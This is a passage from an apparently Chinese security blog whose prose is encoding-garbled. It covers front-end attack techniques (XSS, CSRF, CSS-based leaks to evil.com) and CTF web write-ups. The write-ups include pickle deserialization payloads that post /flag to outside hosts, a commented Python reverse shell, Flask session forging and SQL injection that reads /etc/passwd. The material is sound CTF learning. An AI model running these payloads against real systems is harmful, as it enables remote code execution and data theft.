<h3 id="localStorage-cookie">localStorage cookie</h3>
<blockquote>
<p>cookieå¤§ä½“ä¸Šåˆ†sessionStorage (å­˜å‚¨åœ¨å†…å­˜ä¸­) å’ŒlocalStorage(å­˜å‚¨åœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">localStorage.setItem(&quot;a&quot;, &quot;xxxxxxxxxxxxxxx&quot;);</span><br><span class="line">localStorage.getItem(&quot;a&quot;);</span><br><span class="line">localStorage.removeItem(&quot;a&quot;);</span><br></pre></td></tr></table></figure>
<p>åœ¨æ•°æ®æ—¶æ•ˆæ€§ä¸Š, localStorageä¸åƒsessionStorage å¯ä»¥è®¾ç½®æ•°æ®å­˜æ´»çš„æ—¶é—´, æ‰€ä»¥åªè¦ç”¨æˆ·ä¸å»ä¸»åŠ¨åˆ é™¤, localStorageçš„å†…å®¹å°†æ°¸è¿œå­˜åœ¨.</p>
<p>localStorage å­˜å‚¨å¯¹XSSæ²¡æœ‰ä»»ä½•é˜²å¾¡æœºåˆ¶, ä¸€æ—¦å‡ºç°XSSæ¼æ´, é‚£ä¹ˆå­˜å‚¨åœ¨localStorageçš„æ•°æ®å°±ææ˜“è·å–.</p>
<h3 id="åˆ©ç”¨E4Xæ¥æ··æ·†javascriptä»£ç ">åˆ©ç”¨E4Xæ¥æ··æ·†javascriptä»£ç </h3>
<p>E4XæŠ€æœ¯æ˜¯javascriptå’Œactionscriptçš„ä¸€ç§æ ‡å‡†, å½“å‰åªæœ‰firefoxæ”¯æŒ, è¿™ç§æŠ€æœ¯æ˜¯<strong>å°†XMLä½œä¸ºjavascriptçš„å¯¹è±¡</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    foo = <span class="xml"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="tag">&lt;<span class="name">id</span> <span class="attr">name</span>=<span class="string">"thx"</span>&gt;</span>x<span class="tag">&lt;/<span class="name">id</span>&gt;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span>; <span class="comment">// æ²¡æœ‰å¼•å·åŒ…å›´çš„!</span></span></span><br><span class="line">    alert(foo.id);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å°†javascriptä»£ç æ”¾å…¥xmlæ•°æ®ä¸­ æ¯”å¦‚x=&lt;&gt;alert(â€˜htlloâ€™)&lt;/&gt;, ä½†æ˜¯è¿™æ ·å­ä¸èƒ½è‡ªæ‰§è¡Œ, éœ€è¦eval(x).è¦è¾¾åˆ°è‡ªæˆ‘æ‰§è¡Œ, å°±è¿™æ ·å†™x=&lt;&gt;{alert(â€˜helloâ€™)}&lt;/&gt;, è¡¨ç¤ºé‡Œé¢æ˜¯è¦æ‰§è¡Œçš„è„šæœ¬.</p>
<h3 id="javascript-å‡½æ•°åŠ«æŒ">javascript å‡½æ•°åŠ«æŒ</h3>
<p>åªè¦åœ¨è¿™ä¸ªå‡½æ•°ä½¿ç”¨å‰å†æ¬¡å£°æ˜ä¸€ä¸‹å°±å¥½äº†</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _eval=<span class="built_in">eval</span>;</span><br><span class="line"><span class="built_in">eval</span>=<span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span>(x)==<span class="string">'undefined'</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">    alert(x);</span><br><span class="line">    _eval(x); <span class="comment">// è¿™æ˜¯åŸæœ¬çš„evalå‡½æ•°</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">'alert(1)'</span>);</span><br></pre></td></tr></table></figure>
<p>åœ¨ç°ä»£æµè§ˆå™¨ä¸­éœ€è¦æ”¹ä¸€æ”¹</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _write=<span class="built_in">document</span>.write.bind(<span class="built_in">document</span>);</span><br><span class="line"><span class="comment">// ç”±äºé»˜è®¤æ˜¯åœ¨windowå¯¹è±¡ä¸‹å¯»æ‰¾writeæ–¹æ³•, è€Œwindowå¯¹è±¡å°±æ²¡æœ‰è¿™ä¸ªæ–¹æ³•, å¦‚æœä¸ç»‘å®šçš„è¯, æ¥ä¸‹æ¥çš„_writeæ‰§è¡Œå°±ä¼šæŠ¥é”™</span></span><br><span class="line"><span class="built_in">document</span>.write = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span>(x)==<span class="string">'undefined'</span>)&#123;<span class="keyword">return</span> ;&#125;</span><br><span class="line">    <span class="comment">// any evil code</span></span><br><span class="line">    _write(x);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);</span><br></pre></td></tr></table></figure>
<h3 id="CSS-å®¹é”™æ€§">CSS å®¹é”™æ€§</h3>
<p>å¦‚æœcssæ ·å¼å—ä¸­å‡ºç°éæ³•å­—ç¬¦, å¹¶ä¸å½±å“è§£æ, ä½†æ˜¯å¦‚æœæ ·å¼å—å‰é¢æœ‰å¤§é‡çš„ä¸åˆæ³•æ•°æ®çš„è¯, å¯ä»¥</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;title&gt;1&lt;/title&gt;</span><br><span class="line">.....</span><br><span class="line">&lt;div&gt;....&lt;/div&gt;</span><br><span class="line">&#123;&#125;<span class="selector-tag">h1</span>&#123;<span class="attribute">font-size</span>:<span class="number">50px</span>;<span class="attribute">color</span>:red</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div&gt;xxxx&lt;/div&gt;</span><br><span class="line">&#125;<span class="selector-tag">h2</span>&#123;<span class="attribute">color</span>:green&#125;</span><br></pre></td></tr></table></figure>
<p>h1å‰é¢åŠ ä¸Š<code>{}</code>å°±å¯ä»¥äº†</p>
<h3 id="CSSä¼ªç±»">CSSä¼ªç±»</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.baidu.com/&quot; id=&quot;a1&quot;&gt;http://www.baidu.com/&lt;/a&gt;&lt;br /&gt;</span><br></pre></td></tr></table></figure>
<p>å¹¶é’ˆå¯¹idè®¾ç½®æ ·å¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#a1:visited &#123;background: url(http://www.evil.com/css/steal.php?data=a1);&#125;</span><br></pre></td></tr></table></figure>
<p>åªè¦hrefå­˜åœ¨äºå†å²è®°å½•ä¸­, å°±ä¼šå‘é€è¯·æ±‚</p>
<h3 id="CSS-å±æ€§é€‰æ‹©">CSS å±æ€§é€‰æ‹©</h3>
<p>æ¯”å¦‚</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">style</span>&gt;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^="x"]</span>&#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://www.evil.com/css/steal.php?data=0x);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">attr selector: &lt;input type="text" value="xyz" /&gt;&lt;br /&gt;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœvalueçš„å€¼(xyz)æ˜¯xå¼€å¤´çš„è¯,<a href="http://xn--www-p18dohqgo0d52tjttjx0byz5bj56a87kx8b.evil.com" target="_blank" rel="noopener">é‚£ä¹ˆå°±ä¼šå‘é€ä¸€ä¸ªè¯·æ±‚ç»™www.evil.com</a> , æœ‰ç‚¹ç›²æ³¨çš„æ„Ÿè§‰?</p>
<h2 id="ç¬¬ä¸‰ç« -å‰ç«¯é»‘å®¢ä¹‹XSS">ç¬¬ä¸‰ç«  å‰ç«¯é»‘å®¢ä¹‹XSS</h2>
<h3 id="DOM-xssæ¦‚å¿µ">DOM xssæ¦‚å¿µ</h3>
<p>æ¯”å¦‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="built_in">eval</span>(location.hash.substr(<span class="number">1</span>));</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ‹¥æœ‰è¿™æ®µä»£ç çš„é¡µé¢ä¼šå°†é”šç‚¹åçš„å­—ç¬¦ä¸²æ‰§è¡Œ, URLå¹¶ä¸ä¼šå‘å‘æœåŠ¡ç«¯, è¿™æ•´ä¸ªè¿‡ç¨‹å’ŒæœåŠ¡ç«¯å®Œå…¨æ— å…³, é çš„æ˜¯æµè§ˆå™¨çš„DOMè§£æ, å¯ä»¥è®¤ä¸º<strong>å®Œå…¨æ˜¯å®¢æˆ·ç«¯çš„äº‹æƒ…</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.open(xxx)</span><br><span class="line">window.open(xxx)</span><br><span class="line">window.location.href=...</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval(xxx)</span><br><span class="line">window.execScript(xxx)</span><br><span class="line">window.setInterval(xxx)</span><br><span class="line">window.setTimeout(xxx)</span><br></pre></td></tr></table></figure>
<h2 id="ç¬¬å››ç« -å‰ç«¯é»‘å®¢ä¹‹CSRF">ç¬¬å››ç«  å‰ç«¯é»‘å®¢ä¹‹CSRF</h2>
<p>æ¯”å¦‚</p>
<p><a href="http://xn--www-5d2e139fl8cup3dp60a.b.com" target="_blank" rel="noopener">æ”»å‡»è€…æ„é€ www.b.com</a> å¹¶è¯±å‘å—å®³äººæ‰“å¼€é¡µé¢, æ‰“å¼€çš„æ—¶å€™ä»£ç è§¦å‘, å‘www.a.comå‘é€äº†è½¬è´¦çš„getè¯·æ±‚, è€Œåœ¨æ‰“å¼€bä¹‹å‰è¦æ±‚å·²ç»å®Œæˆäº†é“¶è¡Œçš„èº«ä»½éªŒè¯, è¿™å°±æ˜¯CSRF.</p>
<blockquote>
<p>åŒæºç­–ç•¥å¯ä»¥é™åˆ¶å®¢æˆ·ç«¯è„šæœ¬çš„è·¨åŸŸè¯·æ±‚è¡Œä¸º, ä½†æ˜¯å®é™…ä¸Š, ç”±å®¢æˆ·ç«¯HTMLæ ‡ç­¾å‘å‡ºçš„è·¨åŸŸGETè¯·æ±‚å’ŒPOSTè¯·æ±‚æ˜¯åˆæ³•çš„, ä¸åœ¨åŒæºç­–ç•¥çš„é™åˆ¶ä¸­</p>
</blockquote>
<p>å¯ä»¥æ²¡æœ‰jså‚ä¸</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://www.evil.com</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>æˆ–è€…</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">new</span> Image().src= <span class="string">'http://evil.com'</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè„šæœ¬åªæ˜¯ç”Ÿæˆimgå¯¹è±¡, å¹¶æ²¡æœ‰å‚ä¸è·¨ç«™, ä¸ä¼šè¢«åŒæºç­–ç•¥é˜»æŒ .</p>
<p>æ³¨æ„:</p>
<p>IEçš„ç­–ç•¥é‡Œé¢, ä¸¤ç§cookieä¸­, æœ¬åœ°cookieæ˜¯ä¸å…è®¸åœ¨è·¨åŸŸè¯·æ±‚ä¸­è¢«å¸¦ä¸Š, é™¤éè®¾ç½®P3P, å…¶ä»–æµè§ˆå™¨æ²¡è¿™ç§é™åˆ¶</p>
<h3 id="HTMLå¯ä»¥å‘èµ·GETè¯·æ±‚çš„æ ‡ç­¾">HTMLå¯ä»¥å‘èµ·GETè¯·æ±‚çš„æ ‡ç­¾</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link href=&apos;&apos;&gt;</span><br><span class="line">&lt;img src=&apos;&apos;&gt;</span><br><span class="line">&lt;img lowsrc=&apos;&apos;&gt;</span><br><span class="line">&lt;img dynsrc=&apos;&apos;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;&quot;&gt;</span><br><span class="line">&lt;frame src=&quot;&quot;&gt;</span><br><span class="line">&lt;script src=&quot;&quot;&gt;</span><br><span class="line">&lt;bgsound src=&quot;&quot;&gt;</span><br><span class="line">&lt;embed src=&quot;&quot;&gt;</span><br><span class="line">&lt;video src=&quot;&quot;&gt;</span><br><span class="line">&lt;audio src=&quot;&quot;&gt;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;</span><br><span class="line">&lt;table background=&quot;&quot;&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="CSSä¸­çš„å‘GETè¯·æ±‚">CSSä¸­çš„å‘GETè¯·æ±‚</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@import &quot;&quot;</span><br><span class="line">background:url(&quot;&quot;)</span><br></pre></td></tr></table></figure>
<h3 id="JSON-HiJacking">JSON HiJacking</h3>
<p>è‡ªå®šä¹‰å›è°ƒå‡½æ•°, å°†AJAXä¸­å“åº”æ•°æ®ä¸­çš„JSOnä½œä¸ºå‚æ•°å¹¶å¤„ç†(ç”¨å‚æ•°ä¸­çš„cookieæ¥å‘é€è¯·æ±‚ä¹‹ç±»çš„)</p>
]]></content>
  </entry>
  <entry>
    <title>MiscInWeb & python web[working forever]</title>
    <url>/2019/05/27/MiscInWeb/</url>
    <content><![CDATA[<p><img src="https://user-images.githubusercontent.com/40637063/61510960-a5959180-aa27-11e9-8e97-85fc732fb9ec.png" alt="1563077535097"></p>
<p>è„šæœ¬æ‰¾lv6ä¼šå‘˜</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://web44.buuoj.cn/shop?page="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">1000</span>):</span><br><span class="line">    res = requests.get(url+str(i)).content</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"lv6"</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>è¿›å»æ”¹ä»·æ ¼å’ŒæŠ˜æ‰£,æŠŠæŠ˜æ‰£æ”¹æˆå¾ˆä½çš„ä¸€ä¸ªå€¼å°±ä¼šè·³è½¬åˆ°ä¸€ä¸ªadminç•Œé¢,ä½†æ˜¯è¦ç™»å½•admin.</p>
<p>è¿™é¢˜ç”¨äº†jwt,å…ˆè§£ç å†ç”¨å·¥å…·çˆ†ç ´å¾—åˆ°äº†secretkey,ç„¶åç”¨è¿™ä¸ªå»ä¼ªé€ adminçš„jwt,ç™»å½•.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61510982-bd6d1580-aa27-11e9-8e6f-edf56d75bd82.png" alt="1563074249024"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61510999-d4136c80-aa27-11e9-8478-25a46b4e985d.png" alt="1563077458061"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511037-f5745880-aa27-11e9-9b44-d3a98d308606.png" alt="1563074188880"></p>
<p>å…³é”®çš„æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ˜¯pythonçš„ååºåˆ—åŒ–æ¼æ´,è„šæœ¬å¦‚ä¸‹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">"wget 'http://xss.buuoj.cn/index.php?do=api&amp;id=Krwr7k' --post-data='location='`cat /flag.txt` -O-"</span>,))</span><br><span class="line"></span><br><span class="line">a=test()</span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line">print(urllib.quote(payload))</span><br></pre></td></tr></table></figure>
<p>å½“åºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­,<code>__reduce__</code>å‡½æ•°æè¿°è¿™ä¸ªç±»åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¯¥å¦‚ä½•é‡æ„,ä»Šå„¿é€ æˆäº†å‘½ä»¤æ‰§è¡Œ.</p>
<p>ä½¿ç”¨xss.buuoj.cnå»ºç«‹å†…ç½‘çš„xsså¹³å°å¹¶ä¸”ç›‘å¬,ç„¶åburpå‘é€payloadå¦‚ä¸‹:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511066-12a92700-aa28-11e9-8ddf-65531fc3310b.png" alt="1563076232369"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511084-23f23380-aa28-11e9-90b9-24def8a283d6.png" alt="1563076325322"></p>
<h2 id="CISCN-2019-ä¸œå—èµ›åŒº-web4">CISCN 2019 ä¸œå—èµ›åŒº web4</h2>
<p>è¯»app.pyæºä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request </span><br><span class="line">app = Flask(__name__) </span><br><span class="line">random.seed(uuid.getnode()) </span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">233</span>) </span><br><span class="line">app.debug = <span class="literal">True</span> @app.route(<span class="string">'/'</span>) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span> </span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'www-data'</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World! Read somethings'</span> </span><br><span class="line"><span class="meta">@app.route('/read') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        url = request.args.get(<span class="string">'url'</span>) </span><br><span class="line">        m = re.findall(<span class="string">'^file.*'</span>, url, re.IGNORECASE) </span><br><span class="line">        n = re.findall(<span class="string">'flag'</span>, url, re.IGNORECASE) </span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n: </span><br><span class="line">            <span class="keyword">return</span> <span class="string">'No Hack'</span> </span><br><span class="line">        res = urllib.urlopen(url) </span><br><span class="line">        <span class="keyword">return</span> res.read() </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex: </span><br><span class="line">        <span class="keyword">print</span> str(ex) </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'no response'</span> </span><br><span class="line"><span class="meta">@app.route('/flag') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">'username'</span>] == <span class="string">'fuck'</span>: </span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">'/flag.txt'</span>).read() </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Access denied'</span> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>: </span><br><span class="line">    app.run( debug=<span class="literal">True</span>, host=<span class="string">"0.0.0.0"</span> )</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹ç½‘å¡macåœ°å€/sys/class/net/eth0/address, è¿™æ˜¯éšæœºæ•°ç§å­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">02:42:ae:00:25:dc</span><br></pre></td></tr></table></figure>
<p>ç„¶åç”Ÿæˆsessioncookieåå¸¦ç€å»è®¿é—®/flagè·¯ç”±</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> session_cookie_manager</span><br><span class="line"></span><br><span class="line">mac = <span class="string">"02:42:ae:00:25:dc"</span></span><br><span class="line">random.seed(int(mac.replace(<span class="string">":"</span>, <span class="string">""</span>), <span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    SECRET_KEY = str(random.random() * <span class="number">233</span>)</span><br><span class="line">    rs = session_cookie_manager.FSCM.decode(<span class="string">'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.XSvUPA.wZLQx0OtNIiEv8Q9j2ueW2FJ6-w'</span>, SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'error'</span> <span class="keyword">not</span> <span class="keyword">in</span> rs:</span><br><span class="line">        print(SECRET_KEY)</span><br><span class="line">        rs[<span class="string">u'username'</span>] = <span class="string">'fuck'</span></span><br><span class="line">        print(str(rs))</span><br><span class="line">        print(session_cookie_manager.FSCM.encode(SECRET_KEY, str(rs)))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h2 id="360ctf-ç«‹èª“è¦æˆä¸ºadminçš„ç”·äºº">360ctf ç«‹èª“è¦æˆä¸ºadminçš„ç”·äºº</h2>
<p>å¼€å±€æç¤ºä¸æ˜¯admin</p>
<p>ç›²æ³¨</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67405937-fea53080-f5e7-11e9-8d22-aeddaf0e3cec.png" alt="image"></p>
<p>ç„¶åä½¿ç”¨sqlmapæ¥åå¼¹mysql shell, å‘½ä»¤ <code>mysql -u xxxx -r&quot;xxxxx&quot; -p username --os-shell</code></p>
<p>ç„¶åå‘ç°äº†userè¡¨æ ¼, admin çš„md5 çˆ†ç ´ä¸å‡ºæ¥. å¯ä»¥è¯»å–/etc/passwd, å‘½ä»¤ <code>select load_file('/etc/passwd');</code></p>
<p>å†å°è¯•è¯»å–/var/www/html/index.php, å¤±è´¥,å‘ç«™ç‚¹å†™æ–‡ä»¶å¤±è´¥,è®¿é—®404, å‘½ä»¤<code> username=1' union select 'test' into outfile '/var/www/html/1.php</code>.</p>
<p>æ‰«æç½‘ç«™å‘ç°test.php, è®¿é—®ç»“æœå¦‚ä¸‹, å¦‚æœç™»å½•è¿‡å°±ä¼šæ‰“å°å½“å‰ç”¨æˆ·å, <code>å¯ä»¥çŒœæµ‹ä¸ºsession</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67407018-72940880-f5e9-11e9-916f-92587e78c5e8.png" alt="image"></p>
<p>å‘/tmp/sess_xxxxxxxxxxxå†™å…¥adminçš„åºåˆ—åŒ–å­—ç¬¦ä¸², å¹¶ç”¨xxxxxxxä½œä¸ºPHPSESSIDè®¿é—®index.phpå°±å¯ä»¥å¾—åˆ°flag.</p>
<p>å‘½ä»¤:<code>username=1' union select 'username|s:5:&quot;admin&quot;;' into outfile '/tmp/sess_xxxxxxxxxxxxxxxx</code></p>
<h2 id="swpuctf-2019-web2">swpuctf 2019 web2</h2>
<p>è¿™æ˜¯ä¸€é“flask å’Œredis ç»„åˆçš„é¢˜ç›®, ç”¨æˆ·è®¿é—®flaské¡µé¢ä¹‹åçš„sessionä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨åœ¨redisä¸­, åœ¨æºå¸¦å¯¹åº”sessionè®¿é—®é¡µé¢çš„æ—¶å€™å°±ä¼šå°†redisä¸­å¯¹åº”sessionçš„å€¼æ‹¿å‡ºæ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œ, é¢˜ç›®æç¤ºrediså¼±å£ä»¤, çŒœå‡ºæ¥å¼±å£ä»¤æ˜¯password , è¿œç¨‹è¿æ¥rediså‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h 114.67.109.247 -a password</span><br></pre></td></tr></table></figure>
<p>å¸¸ç”¨å‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keys abb* æŸ¥çœ‹ä»¥abbå¼€å¤´çš„é”®å</span><br><span class="line">get xxxxxxxxxx æŸ¥çœ‹é”®åæ‰€å¯¹åº”çš„å€¼</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬è¿›å…¥redisä¹‹åå…ˆä»æµè§ˆå™¨æŸ¥çœ‹è‡ªå·±çš„sessionç„¶åä¿®æ”¹åœ¨redisä¸­çš„å€¼, è¿™é‡Œè¦æ³¨æ„, æµè§ˆå™¨ä¸­çš„sessionå€¼æ¯”å¦‚æ˜¯<code>13f6bcbd-79f9-4244-9ac9-0cbd8ba51c43.b-AAbkvcTO8kkzyFfsVTBiRgPDc</code>, é‚£ä¹ˆåœ¨redisä¸­å­˜å‚¨çš„é”®æ˜¯13f6bcbd-79f9-4244-9ac9-0cbd8ba51c43ä¹Ÿå°±æ˜¯ç‚¹å·å‰é¢çš„éƒ¨åˆ†è€Œä¸æ˜¯å…¨éƒ¨, è¿™ä¸€ç‚¹æ˜¯å½“æ—¶è§‚å¯Ÿredisä¸­çš„é”®åå‘ç°çš„, ä½†æ˜¯ä¸ºä»€ä¹ˆä¼šè¿™æ ·ä¹Ÿè¿˜æ²¡æœ‰å¼„æ‡‚, æœ€åå‚è€ƒäº†(pç‰›çš„åšå®¢)[<a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a>]å’Œè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""curl -d "@/flag" 39.105.176.37:12334"""</span></span><br><span class="line">        <span class="comment">#  s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("39.105.176.37",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = cPickle.dumps(e)</span><br><span class="line"></span><br><span class="line">r = redis.Redis(host=<span class="string">'114.67.109.247'</span>, port=<span class="number">6379</span>, password=<span class="string">'password'</span>)</span><br><span class="line"></span><br><span class="line">r.set(<span class="string">"session:58b89cd8-a994-4436-99d3-a6612ba42774"</span>, s)</span><br></pre></td></tr></table></figure>
<p>æœåŠ¡å™¨å¼€å¯ç›‘å¬, ç„¶ååˆ·æ–°æµè§ˆå™¨å°±å¯ä»¥æ”¶åˆ°flagäº†</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70392153-a7ccac80-1a17-11ea-84d3-4c968f19a38a.png" alt="image"></p>
